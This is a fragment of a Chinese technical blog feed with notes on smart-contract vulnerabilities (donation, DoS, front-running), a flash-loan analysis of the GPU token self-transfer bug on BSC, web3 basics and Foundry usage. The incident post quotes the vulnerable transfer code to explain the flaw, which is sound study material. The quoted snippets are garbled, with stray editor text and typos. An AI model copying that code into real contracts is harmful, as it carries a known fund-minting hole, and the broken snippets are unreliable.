        <content type="html"><![CDATA[<h2 id="抢先交易攻击"><a href="#抢先交易攻击" class="headerlink" title="抢先交易攻击"></a>抢先交易攻击</h2><h3 id="是否有措施防止或创建模式中的抢先交易漏洞"><a href="#是否有措施防止或创建模式中的抢先交易漏洞" class="headerlink" title="是否有措施防止或创建模式中的抢先交易漏洞"></a>是否有措施防止或创建模式中的抢先交易漏洞</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>捐款攻击</title>
      <link href="/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/"/>
      <url>/2024/10/07/%E6%8D%90%E6%AC%BE%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="捐款攻击"><a href="#捐款攻击" class="headerlink" title="捐款攻击"></a>捐款攻击</h2><h3 id="该协议是否依赖于balance或者balanceof，而不是内部会计"><a href="#该协议是否依赖于balance或者balanceof，而不是内部会计" class="headerlink" title="该协议是否依赖于balance或者balanceof，而不是内部会计"></a>该协议是否依赖于balance或者balanceof，而不是内部会计</h3><h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>   在以太坊网络上，任何地址的余额（无论是以太币还是代币）都可以通过address(this).balance 或token.balanceof(address)查询。然而，外部账户的余额可以被外部操作（如其他合约调用、用户转账等）响。依赖于外部状态（即余额）可能导致合约的内部逻辑失去一致性，因为外部账户的状态在合约运行期间是不可预测的。</p><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>   首位存款人可以中断股份的锻造，如果总资产通过大量捐款被操纵，用户可能无法获得其存款的股份，攻击者操纵依赖于balanceof确定总资产金额并阻止其他用户通过存款换取股份</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>拒绝服务攻击（DOS）</title>
      <link href="/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/"/>
      <url>/2024/10/06/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB%EF%BC%88DOS%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h3 id="拒绝服务（DOS）攻击"><a href="#拒绝服务（DOS）攻击" class="headerlink" title="拒绝服务（DOS）攻击"></a>拒绝服务（DOS）攻击</h3><h3 id="未设定gas费率的外部调用"><a href="#未设定gas费率的外部调用" class="headerlink" title="未设定gas费率的外部调用"></a>未设定gas费率的外部调用</h3><p> 在以太坊中，每一笔交易都会携带一定数量的Gas，这是为了确保任何执行的操作都不会消耗过多的计算资源，从而避免网络拥堵或资源耗尽。当一笔交易开始执行时，它会从交易者提供的Gas总量中扣除费用，直到合约执行完成或Gas耗尽。如果在执行过程中Gas耗尽，那么交易将被回滚，且已经消耗的Gas不会退还给用户。</p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   1， 攻击者可以通过构造高复杂度的交易或智能合约来故意消耗大量的Gas，从而正常交易无法被包含在区块中。例如，攻击者可以创建一个合约，该合约在接收到消息时执行大量计算或存储操作，消耗接近最大Gas限额的Gas量。当许多这样的交易被同时发送到网络时，它们会占据大部分甚至全部的Gas容量，导致其他用户的正常交易无法被确认，从而达到拒绝服务的效果。<br>   2，使智能合约进入无限循环，这将导致Gas立即耗尽，交易失败并回滚。这种攻击通常发生在合约逻辑中存在错误的情况下，例如没有正确处理循环退出条件，或在递归调用中缺少终止条件。当合约进入无限循环时，它会尝试消耗所有可用的Gas，最终导致交易失败，并可能使合约处于不可用状态。</p><h4 id="解决方法："><a href="#解决方法：" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   使用call函数时可以调试出执行操作需要的大致gas费率，在call函数指定稍大一些费率，避免攻击发生。</p><h3 id="依赖外部的调用进展"><a href="#依赖外部的调用进展" class="headerlink" title="依赖外部的调用进展"></a>依赖外部的调用进展</h3><h4 id="漏洞分析：-1"><a href="#漏洞分析：-1" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>这种情况是由于合约没有正确处理外部调用。例如，如果合约依赖于外部函数执行的结果，但合约没有对外部函数执行失败进行处理，此时如果外部调用失败或者由于外部原因而被拒绝时，会导致每次执行交易时都会因为这个失败问题导致交易回滚，合约无法继续执行。</code></pre><h4 id="举例："><a href="#举例：" class="headerlink" title="举例："></a>举例：</h4><p>   在竞拍合约中，出价者高成为king，并把上一位king的钱transfer回去，但是如果上一位king并不能接受钱的话,那么他就会一直成为king，就相当于拒绝其他人的出高价竞拍</p><h4 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h4><p>   在竞拍合约中尽量让合约参与者自提参与竞拍的token，其次如果确实需要对外部函数调用的结果进行处理才能进入新的状态，请考虑外部调用可能一直失败的情况，也可以添加基于时间的操作，防止外部函数调用一直无法满足require判断。</p><h3 id="Owner的错误操作"><a href="#Owner的错误操作" class="headerlink" title="Owner的错误操作"></a>Owner的错误操作</h3><h4 id="漏洞分析：-2"><a href="#漏洞分析：-2" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   这种拒绝服务攻击就是建立在后期运营情况下，在智能合约中通常会存在以 Owner 账户作为管理员角色，该角色通常会持有很高的权限，例如开启或暂停转账功能，当 Owner 角色操作失误或私钥丢失可能会受到非主观意义上的拒绝服务攻击。</p><h4 id="解决方法：-1"><a href="#解决方法：-1" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   建议设计多个owner地址，避免密钥遗失等问题发生时，导致合约被锁，同时一个综合系统中只有一个绝对权限的管理员是极其不安全的。</p><h3 id="数组或映射过长"><a href="#数组或映射过长" class="headerlink" title="数组或映射过长"></a>数组或映射过长</h3><h4 id="漏洞分析：-3"><a href="#漏洞分析：-3" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><pre><code>当合约中存在对传入的映射或数组循环遍历的逻辑且没有限制传入的映射或数组的长度时攻击者可以通过传入超长的映射或者数组进行循环遍历而大量消耗 Gas 从而该笔交易的 Gas 溢出，最后使得智能合约暂时或永久不可操作。</code></pre><h4 id="举例"><a href="#举例" class="headerlink" title="举例"></a>举例</h4><p>  在利益分发合约中，类似于公司给股东分红，如果员工人数过于多，即数组过大会导致操作执行的gas远远超于上限，从而导致交易失败，也就无法分红</p><h4 id="解决方法：-2"><a href="#解决方法：-2" class="headerlink" title="解决方法："></a>解决方法：</h4><p>   避免需要循环操作的数组或映射能够被外部调用，同时在合理的增长过程，可以采用分区块处理的方式，避免数组或映射过大失败。</p><h3 id="依赖库的问题"><a href="#依赖库的问题" class="headerlink" title="依赖库的问题"></a>依赖库的问题</h3><h4 id="漏洞分析：-4"><a href="#漏洞分析：-4" class="headerlink" title="漏洞分析："></a>漏洞分析：</h4><p>   依赖外部的合约库。如果外部合约的库被删除，那么所有依赖库的合约服务都无法使用。有些合约用于接受ether，并转账给其他地址。但是，这些合约本身并没有自己实现一个转账函数，而是通过delegatecall去调用一些其他合约中的转账函数去实现转账的功能。万一这些提供转账功能的合约执行suicide或self-destruct操作的话，那么，通过delegatecall调用转账功能的合约就有可能发生ether被冻结的情况</p><h4 id="举例-1"><a href="#举例-1" class="headerlink" title="举例"></a>举例</h4><p>  Parity 钱包遭受的第二次攻击是一个很好的例子。Parity 钱包提供了多签钱包的库合约。当库合约的函数被 delegatecall 调用时，它是运行在调用方（即：用户多签合约）的上下文里，像 m_numOwners 这样的变量都来自于用户多签合约的上下文。另外，为了能被用户合约调用，这些库合约的初始化函数都是public的。攻击者就调用初始化函数把自己设置为库函数的owner，在调用kill（）函数，把库合约删除，所有的ether就被冻结了</p><h4 id="解决方法：-3"><a href="#解决方法：-3" class="headerlink" title="解决方法："></a>解决方法：</h4><p>  继承库合约后，对于可以改变指智能合约存储状态的函数，尽量采取重写的方式，避免被恶意调用。特别是owner修饰词，转账函数。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>20240508 BSC攻击事件分析</title>
      <link href="/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/"/>
      <url>/2024/09/29/20240508-BSC%E6%94%BB%E5%87%BB%E4%BA%8B%E4%BB%B6%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h2 id="BSC攻击事件分析"><a href="#BSC攻击事件分析" class="headerlink" title="BSC攻击事件分析"></a>BSC攻击事件分析</h2><p>这是一起发生在2024年5月8日币安智能链（BSC）上的闪贷攻击事件，影响的是GPU代币合约。该合约存在自转账漏洞，每次自转账都会导致资产翻倍。黑客利用该漏洞，通过DODO协议以闪贷的方式借入BUSD，在PancakeSwap上兑换成GPU代币，再利用漏洞进行多次自转账，导致其GPU代币余额增加了100亿倍，达到28,070,259,409,924枚代币。最后，黑客将GPU代币卖出换成BUSD，用于偿还闪贷本息，最终窃取约3.2万美元资金。</p><p>首先攻击者从DODO借贷协议中发起闪电贷，借出BUSD到攻击合约地址，攻击者合约在调用PancakeSwap协议，将借出的BUSD兑换成GPU代币，利用自我转账漏洞，凭空产生CPU代币，攻击者合约自己给自己转账，每转账一次，GPU资产就会翻倍，攻击者合约将获取到的GPU代币发送到PancakeSwap V2协议中，换取BUSD。然后攻击者从PancakeSwap V2协议中获取的BUSD，将其中的一部分用于返还DODO借贷协议的本金和利息，剩下的都是攻击者所获得的。</p><p>完整的调用信息看<a href="https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb?line=6">这里</a></p><p>下面是DODO协议中借贷协议中的借贷函数<strong>flashLoan</strong>的部分信息，用于从DODO协议资金池中借贷指定数量的资产，这里的参数baseAmount为零，而quoteAmount为226007，表示借贷这么多个BUSD，assetTo为攻击者合约地址，data则在回调函数中使用到<br>简单的讲该函数分为3个部分，第一个部分讲资产发送到目标地址，第二部分执行目标地址的回调函数，通常用于实现套利逻辑，第三部分校验是否归还本利息</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function flashLoan(</span><br><span class="line">        uint256 baseAmount,</span><br><span class="line">        uint256 quoteAmount,</span><br><span class="line">        address assetTo,</span><br><span class="line">        bytes calldata data</span><br><span class="line">    ) external preventReentrant &#123;</span><br><span class="line">    // step1 transfer token to target address</span><br><span class="line">        _transferBaseOut(assetTo, baseAmount);</span><br><span class="line">        _transferQuoteOut(assetTo, quoteAmount);</span><br><span class="line"></span><br><span class="line">// step2 callback function</span><br><span class="line">        if (data.length &gt; 0)</span><br><span class="line">            IDODOCallee(assetTo).DPPFlashLoanCall(msg.sender, baseAmount, quoteAmount, data);</span><br><span class="line"></span><br><span class="line">        uint256 baseBalance = _BASE_TOKEN_.balanceOf(address(this));</span><br><span class="line">        uint256 quoteBalance = _QUOTE_TOKEN_.balanceOf(address(this));</span><br><span class="line"></span><br><span class="line">        // step3 check balance</span><br><span class="line">        require(</span><br><span class="line">            baseBalance &gt;= _BASE_RESERVE_ || quoteBalance &gt;= _QUOTE_RESERVE_,</span><br><span class="line">            &quot;FLASH_LOAN_FAILED&quot;</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        // ...;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><strong>PancakeRouter</strong>合约，该合约主要用于BUSD和GPU代币的兑换，由于GPU合约会在兑换环节中收取手续费，兑换的另一个代币数量可能无法提前准确计算，因此这里使用了下面的<strong>swapExactTokenForTokensSupportingFeeOnTransferTokends函数</strong>，参数<strong>amountln</strong>表示往池子里存入的代币数量，而参数<strong>amountOutMin</strong>表示从池子里取出来另一种代币的最小数量，<strong>path</strong>代表代币的兑换路径，如 <strong>[address(A),address(B)]<strong>表示A代币兑换成B代币，参数</strong>to</strong> 表示兑换出来的代币转入目标地址，<strong>deadline</strong>为兑换有效日期<br>该函数简单分为以下几个部分，第一部分把A代币转入相应的池子中，第二部分通过**_swapSupportingFeeONTransferTokens函数<strong>计算B代币的数量并转给</strong>to<strong>地址，第三部分判断得到的B代币数量是否满足</strong>zamountOutMin**的要求</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function swapExactTokensForTokensSupportingFeeOnTransferTokens(</span><br><span class="line">    uint amountIn,</span><br><span class="line">    uint amountOutMin,</span><br><span class="line">    address[] calldata path,</span><br><span class="line">    address to,</span><br><span class="line">    uint deadline</span><br><span class="line">) external virtual override ensure(deadline) &#123;</span><br><span class="line">// step1 transfer A token to pool</span><br><span class="line">    TransferHelper.safeTransferFrom(</span><br><span class="line">        path[0], msg.sender, PancakeLibrary.pairFor(factory, path[0], path[1]), amountIn</span><br><span class="line">    );</span><br><span class="line">    uint balanceBefore = IERC20(path[path.length - 1]).balanceOf(to);</span><br><span class="line">    </span><br><span class="line">    // step2 calculate and transfer B token</span><br><span class="line">    _swapSupportingFeeOnTransferTokens(path, to);</span><br><span class="line">    </span><br><span class="line">    // step3 check B token amount</span><br><span class="line">    require(</span><br><span class="line">        IERC20(path[path.length - 1]).balanceOf(to).sub(balanceBefore) &gt;= amountOutMin,</span><br><span class="line">        &#x27;PancakeRouter: INSUFFICIENT_OUTPUT_AMOUNT&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>GPU是一个普通的ERC20代币，他的转账函数如下，这里并没有进行<strong>from</strong> 和<strong>to</strong>的是否相等的判断，实际的转账逻辑正发生在父合约中，正是如此，这个漏洞很少被发现</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(</span><br><span class="line">  address from, address to, uint256 amount) internal override &#123;</span><br><span class="line">   require(from != address(0)，&quot;ERC20: transfer from the zero address&quot;); require(to != address(0)，&quot;ERC20: transfer to the zero address&quot;); require(amount&gt;0);</span><br><span class="line">   &#125;</span><br><span class="line">   if(_isExcludedFromFeesVip[from] || _isExcludedFromFeesVip[tol])&#123;</span><br><span class="line">    super._transfer(from, to, amount);You, 2 days ago &quot; add demo</span><br><span class="line">      return;</span><br><span class="line">       if(super.balance0f(address(this)) &gt;super.balance0f(uniswapV2Pair).div(2000))&#123;</span><br><span class="line">           if (_isExcludedFromFees[from] || _isExcludedFromFees[tol]) &#123;&#125; else &#123;</span><br><span class="line">                if(_isPairs[from])&#123;</span><br><span class="line">                      require(startTime &lt; block.timestamp,&quot;startTime&quot;);</span><br><span class="line">                     if(startTime.add(18 * 30 *86400) &gt; block. timestamp)&#123;</span><br><span class="line">                     super._transfer(from, _destroyAddress, amount.div(100).mul (2)); super._transfer(from, address(this)，amount.div(100).mul(1)); amount = amount.div(100).mul(97);</span><br><span class="line">                     &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>而父合约的_<strong>tranfer</strong>函数，也没有进行<strong>from</strong> 和<strong>to</strong> 是否相等的检查，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function _transfer(address sender,address recipient,uint256 amount )internal virtual &#123;</span><br><span class="line"></span><br><span class="line">       (requirelsender != address(0), &quot;ERC20: transfer from the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      (require(recipient != address(0),&quot;ERC20: transfer to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">          uint256 senderAmount = _balances [sender];</span><br><span class="line"></span><br><span class="line">          uint256 recipientAmount = _balances [recipient];</span><br><span class="line"></span><br><span class="line">          (requirelsenderAmount &gt;= amount,&quot;ERC20:transfer amount exceeds balance&quot;);</span><br><span class="line">  </span><br><span class="line">          _balances [sender]= senderAmount. sub(amount);</span><br><span class="line"></span><br><span class="line">          _balances[recipient] = recipientAmount.add(amount);</span><br><span class="line"></span><br><span class="line">        emit Transfer(sender, recipient, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从以上代码我们可以看见，，在进行 transfer 时，先保存 from 和 to 的 balance 到变量 senderAmount 和 recipientAmount，随后计算转账后的 senderAmount 和 recipientAmount 的值，最后在更新到 balances 中。但是，当 from 和 to 为同一地址时，先更新 from 再更新 to 其实就是给 to 凭空添加了 amount 数量的 token。所以，攻击者通过持续给自己转账从而让自己的GPU Token凭空增多。</p><p>这个攻击成功就是利用了自我转账的漏洞，我认为要防御的话加个对转账地址和被转账地址是否相等的条件</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>web3学习知识</title>
      <link href="/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/"/>
      <url>/2024/09/29/web3%E5%AD%A6%E4%B9%A0%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>最近又发现一个学习网站，正好趁着国庆假期，再把知识又巩固一遍，就写了这篇学习学习笔记记录一下</p><h2 id="含义"><a href="#含义" class="headerlink" title="含义"></a>含义</h2><p>以前我们的信息都集中在一个软件上，这造成了，我们的信息就会被泄露，就比如2018年Facebook-剑桥分析公司数据泄露丑闻，数百万Facebook用户的个人信息被不当收集并用于影响政治选举，这就是数据集中控制的风险和后果</p><p>那么web3就出现了，它是建立在区块链技术上的下一代互联网，它强调<strong>权力下放</strong>，这就意味着没有集中的权威机构来管理数据和资源</p><p>在web3的世界里，用户拥有自己创立的内容和数据，摆脱了对传统中心化平台的依赖，由此web3也促进了新的商业模式，例如：<strong>去中性化金融（DeFi）</strong>   <strong>非同质化代币（NFT）</strong>  <strong>去中性化自治组织（DAO）</strong></p><p>它的发展来看：从Web1.0时代的静态网页，到Web2.0的社交互动，再到Web3.0的去中心化智能网络</p><p>Web3 各赛道百花齐放，共同构建一个去中心化、透明化、创新化的数字生态。去中心化金融（DeFi）消除了中介机构，实现了开放式的金融交易和服务；非同质化代币（NFT）赋予了数字资产唯一性和价值；去中心化自治组织（DAO）促进了集体决策和公平管理；去中心化身份（DID）保障了个人身份数据的安全和隐私；社交金融（SocialFi）和游戏金融（GameFi）将传统的社交、游戏活动与经济激励相结合，重新定义了用户参与的价值；基础设施赛道为所有这些创新提供了稳定的技术支持和发展平台。</p><h2 id="web3领域的知识"><a href="#web3领域的知识" class="headerlink" title="web3领域的知识"></a>web3领域的知识</h2><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>加密和解密使用同样的密钥，这样就必须双方知道密钥，并且都保证不向外传，但是这样的保密性不高，只要有人得到了密钥，就能解密</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>就是一个人，有俩个密钥，一个公钥，一个私钥，下面将详细解释</p><h3 id="公钥和私钥"><a href="#公钥和私钥" class="headerlink" title="公钥和私钥"></a>公钥和私钥</h3><p>私钥：私钥是随机生成的字符串，通常由一系列字母和数字组成，是用户身份和资产管理的核心，必须严格保密。<br>公钥:公钥由私钥生成，是私钥的配对密钥，可以公开共享，用于验证信息和加密私钥签名的数据。<br>以前没有分清楚公钥和私钥的作用，现在我明白了，就举个例子吧<br>A向B发送一个交易，首先A获得B的公钥，用来对交易加密，B收到交易后用他自己的私钥进行解密，但是公钥是公开的，谁都可以用B的公钥加密交易，冒充A给B发，所以就有数字签名出现了，A在发送消息前用自己的私钥先对交易签名，生成v,r,s,B接受到消息后就可以使用A的公钥进行解密，这使用了非对称加密和数字签名的技术</p><h3 id="defi"><a href="#defi" class="headerlink" title="defi"></a>defi</h3><p>去中心化金融（简称 DeFi）是一种基于区块链技术的金融生态系统。它利用智能合约（可自动执行的程序代码）实现金融服务自动化，同时消除传统金融系统中的银行和经纪人等中介机构。在 DeFi 的世界里，所有交易和服务都是透明的、无需许可的，并且对任何有互联网访问权限的人开放</p><p>与传统的中心化金融（CeFi）相比，去中心化金融在可及性、透明度、安全性、效率、创新性和去中心化方面具有显著优势。</p><ul><li>首先，DeFi 提供无边界金融服务，确保全球用户只要有互联网连接就可以不受地域限制地进行交易。这对于传统银行服务不足或无法使用的地区尤为重要。</li><li>其次，DeFi 利用区块链技术公开记录所有交易，任何人都可以验证和审计这些记录。这种开放性大大提高了系统的透明度和可信度，使用户能够清楚地看到资金的流向，从而减少了隐藏的费用和潜在的不当行为。</li><li>在安全性方面，DeFi 通过先进的加密技术保护用户的资金和交易，大大降低了欺诈和黑客攻击的风险。自动化智能合约还可以确保无缝执行交易，而无需传统金融机构典型的复杂程序和人工审核，从而提高运营效率。</li><li>在创新方面，DeFi 的开放开发平台吸引了来自世界各地的开发者，推动了新的金融产品和服务不断涌现。这种以社区为主导的开发模式鼓励思想交流和快速迭代，加速了金融领域的技术进步。</li><li>最后，与可能面临宕机风险的传统金融机构不同，DeFi 的分布式结构本质上消除了单点控制，增强了系统对故障和攻击的抵御能力。即使某些节点受到攻击，网络仍可持续运行，确保金融服务的连续性和稳定性。<br>一些经典的defi项目，我之前有写过笔记，可以去了解一下</li></ul><h3 id="NFT"><a href="#NFT" class="headerlink" title="NFT"></a>NFT</h3><p>在深入研究非同质化代币（NFT）之前，我们需要了解“可同质化”和“不可同质化”的概念。在加密货币的世界里，可互换性意味着可互换性。例如，如果你有 1 个 BTC，我也有 1 个 BTC，即使这两个 BTC 可能位于不同的钱包地址，但它们具有相同的价值，可以直接交换。这就像用一张 100 美元的钞票换另一张相同面值的钞票一样。另一方面，非同质化意味着独特性和不可替代性。非同质化代币 (NFT) 就是这样独特且不可互换的数字资产。NFT 通常用于证明数字艺术品、收藏品等资产的所有权。</p><p>与同质化代币相比，非同质化代币（NFT）在所有权验证、唯一性、收藏价值、市场流动性和参与度等方面具有独特的价值：</p><ul><li>首先，作为区块链技术的产物，NFT 为数字资产提供了不可篡改的所有权证明。这意味着艺术家和内容创作者可以确保他们的原创作品得到合法认证和追踪，从而保护他们的知识产权。</li><li>其次，由于每个 NFT 都是不可替代的，其固有的稀缺性成为其重要的价值来源。这种稀缺性，尤其是对于独特的艺术品而言，赋予了 NFT 极高的收藏价值。</li><li>此外，尽管 NFT 不可替代，但它们仍可以在全球多个平台上买卖和交易，从而为其提供流动性。随着市场的不断增长，这种流动性正在稳步增加。</li><li>最后，一些 NFT 项目允许持有者对项目的发展进行投票或提供社区特定的福利。这增强了用户体验，使 NFT 不仅仅是一种收藏品，而是一个拥有社区和生态系统的活跃项目。</li></ul><h3 id="DAO"><a href="#DAO" class="headerlink" title="DAO"></a>DAO</h3><p>一个去中心化自治组织（DAO）是基于区块链技术的组织形式，通过智能合约自动执行组织的规则和决策。与传统公司不同，DAO 缺乏管理层和中央权威；所有决策都通过成员投票或预定算法做出。成员通常持有赋予他们投票权的代币，使他们能够直接参与组织的治理，例如提出提案、决定项目方向和分配资金。</p><p>与传统公司相比，DAO 在透明度、信任要求、运营效率、参与式民主和安全性方面具有显著优势。</p><ul><li>首先，DAO 内的所有决策过程和金融交易都公开记录在区块链上，任何外部审计师都可以轻松验证，从而提高了组织的透明度。</li><li>其次，DAO 内部成员之间的交互是通过代码来实现的，成员​​只需要信任智能合约代码本身，而不需要像传统公司那样信任个别领导或者一个中心化的团队。</li><li>此外，由于智能合约可以自动执行任务，这减少了手动处理的需要，消除了许多不必要的中介，并提高了组织运营的效率。</li><li>此外，DAO 允许每个持有代币的成员参与决策，促进更加民主的决策过程，并确保组织真正由社区成员驱动。</li><li>最后，区块链技术的使用增强了 DAO 的安全性，因为它依靠加密和共识算法来保护数据和资产，从而在很大程度上防止外部攻击和内部滥用。</li></ul><h3 id="Web3钱包"><a href="#Web3钱包" class="headerlink" title="Web3钱包"></a>Web3钱包</h3><p>Web3 钱包是一种专为与 Web3 技术（去中心化网络）集成而设计的数字货币钱包。与传统数字货币钱包不同，Web3 钱包允许用户与去中心化应用程序 (DApp) 交互、签署交易并管理其加密资产，而无需依赖中心化第三方。这些钱包通常支持多种加密货币，并提供安全的私钥管理功能，以确保用户资金的安全。</p><p>在 Web3 世界中，一些流行的钱包应用程序因其安全性、易用性和功能性而脱颖而出，成为用户的首选。以下是一些流行的 Web3 钱包：</p><ul><li>MetaMask：MetaMask 是最著名的以太坊钱包之一。它是一个浏览器扩展和移动应用程序，允许用户在网络浏览器中轻松访问以太坊 DApp 并管理其加密资产。</li><li>Trust Wallet：Trust Wallet 是一款安全的移动钱包应用程序，支持多种加密货币，包括以太坊和比特币。它提供了用户友好的界面，并支持与 DeFi 应用程序集成。</li><li>Coinbase 钱包：Coinbase 钱包是加密货币交易平台 Coinbase 推出的一款钱包应用，支持以太坊和 ERC-20 代币，内置 DApp 浏览器。</li><li>币安链钱包：币安链钱包是加密货币交易平台币安推出的钱包应用，旨在兼容币安智能链（BSC）并支持多种加密货币和DApp。</li><li>Trezor：Trezor 是一款以高安全性和便携性著称的硬件钱包。它支持多种加密货币，包括比特币和以太坊，是安全存储加密资产的理想选择。</li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CCF区块链技术与应用创新竞赛</title>
      <link href="/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/"/>
      <url>/2024/09/25/CCF%E5%8C%BA%E5%9D%97%E9%93%BE%E6%8A%80%E6%9C%AF%E4%B8%8E%E5%BA%94%E7%94%A8%E5%88%9B%E6%96%B0%E7%AB%9E%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<h3 id="参赛队伍最多4人，需要一名指导老师"><a href="#参赛队伍最多4人，需要一名指导老师" class="headerlink" title="参赛队伍最多4人，需要一名指导老师"></a>参赛队伍最多4人，需要一名指导老师</h3><h3 id="报名时间：截止到2024年9月30号"><a href="#报名时间：截止到2024年9月30号" class="headerlink" title="报名时间：截止到2024年9月30号"></a>报名时间：截止到2024年9月30号</h3><h3 id="提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn"><a href="#提交作品：截止到2023年10月31号-网址https-btc-ccf-org-cn" class="headerlink" title="提交作品：截止到2023年10月31号 网址https://btc.ccf.org.cn"></a>提交作品：截止到2023年10月31号 网址<a href="https://btc.ccf.org.cn/">https://btc.ccf.org.cn</a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>foundry的使用和安装</title>
      <link href="/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/"/>
      <url>/2024/09/22/foundry%E7%9A%84%E4%BD%BF%E7%94%A8%E5%92%8C%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>上次那个<a href="https://updraft.cyfrin.io/">网站</a>,里面有讲foundry，虽然以前学习过，但是还是没能具体学习过，只会一些测试的用法，其他高深的用法还没有了解到，借此机会再次学习一下，就写了这个笔记</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>推荐这个网站<a href="https://book.getfoundry.sh/">Foundry-Book</a>;<br>安装完成后，在终端使用指令：Forge –version 查看有没有安装好，如果没有，就删除从头再来一遍</p><p>我们使用的是windows的系统就要去找属于window安装教程（我就反复安装，吃了很多亏），如果你想使用windows上的子系统Linux,就可以在你的终端使用 wsl –install ,然后重启安装即可</p><h2 id="使用-（forge-）"><a href="#使用-（forge-）" class="headerlink" title="使用 （forge ）"></a>使用 （forge ）</h2><p>最开始我还没有了解到怎么自己用Foundry全是从仓库 git clone 下来，它自带Foundry,就不需要自己构建文件夹。现在就介绍一下怎么构建一个文件夹包含Foundry测试框架。（注意我们使用的是VSCODE这个软件，非常好用）</p><ul><li>首先创建一个文件夹，在git base终端上输入 forge init 文件夹名字</li><li>进入文件夹 cd 文件夹名字 </li><li>再构建项目 forge build 或则 forge compile</li><li>测试时使用 forge test 如果要测试，测试合约中的一个测试函数，是可以使用过滤条件方法：forge test –match-contract 测试合约名 –match-test 测试函数</li></ul><h2 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h2><p>一些Cast的指令：</p><ul><li>获取当前链的ID：cast chain-id</li><li>获取当前客户端版本：cast client</li><li>获取当前gas价格：cast gas-price</li><li>查询最新的区块号：cast block-number</li><li>获取当前的网络基础费：cast basefee</li><li>获取block的详细信息：cast block</li><li>获取区块的时间戳信息：cast age</li><li>查询特定的以太坊账户地址：cast balance 地址   如果不知道地址，就使用ENS查询：cast balance vitalik.eth</li><li>查看源代码：cast etherscan-source 地址</li></ul><h2 id="anvil"><a href="#anvil" class="headerlink" title="anvil"></a>anvil</h2><p>它可以提供一个方便测试和开发的以太坊节点<br>使用anvil指令，它可以输出账户，私钥，链ID，基本费用等<br>通过使用anvil-h,可以查看anvil所有的配置选项<br>使用anvil -a 数量，可以生成指定的数量开发账户</p><h2 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h2><p>Chisel是一个Solidity REPL,用于编写和测试Solidity代码片段，它提供了一个用于编程和执行ASolidity代码的交互式环境</p><h2 id="Forge-Std"><a href="#Forge-Std" class="headerlink" title="Forge Std"></a>Forge Std</h2><p>它是Forge标准库，为Foundry框架提供了丰富的辅组合约，简化和加速编写智能合约测试的过程并提升用户体验<br>使用Forge Std 只需要在测试合约导入Test.sol并继承Test</p><p>核心功能：<br>访问Hevm:通过vm实例直接使用，cheatcode模拟各种区块链状态和行为</p><blockquote><p>Hevm是DappHub团队开发的以太坊虚拟机实现，专门用于测试和调试智能合约，它是一个命令行工具，可以模拟以太坊网络的行为，允许开发人员在本地执行测试和调试它们的合约，而无需连接到实际的以太坊网络<br>断言和日志：从Dappsys Test 继承，具有断言功能和一Hardhat为风格的日志记录<br>标准库功能：Forge Std 提供的标准库包括各种实用的工具和功能，例如，向指定账户发送代币</p></blockquote><p>在Forge标准库的测试合约中，通过vm实例可以方便的访问作弊码<br>例如：身份转化：vm.prank;使用vm.prank()函数，我们可以暂时切换调用者的身份</p><h2 